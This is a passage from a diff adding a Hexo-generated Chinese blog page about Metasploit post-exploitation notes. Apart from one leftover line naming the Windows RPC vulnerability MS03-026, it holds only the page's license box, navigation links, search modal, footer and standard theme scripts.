class="hljs-number">9</span>X/ME/NT/<span class="hljs-number">2000</span>/XP/<span class="hljs-number">2003</span>)<br>MS03-<span class="hljs-number">026</span> 　<span class="hljs-selector-attr">[KB823980]</span> <span class="hljs-selector-attr">[RPC接口中的缓冲区溢出]</span>（/ NT / <span class="hljs-number">2000</span> / XP / <span class="hljs-number">2003</span>）<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>MSF额外知识</div>
+      <div>http://example.com/2024/10/21/网络安全/后渗透/ATT-CKMSF/MSF额外知识/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Svanur</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年10月21日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/10/21/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%90%8E%E6%B8%97%E9%80%8F/ATT-CKMSF/MSF%E5%88%9D%E8%AF%86/" title="MSF初识">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">MSF初识</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/10/21/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%20%E4%B8%80/" title="红日靶场 一">
+                        <span class="hidden-mobile">红日靶场 一</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
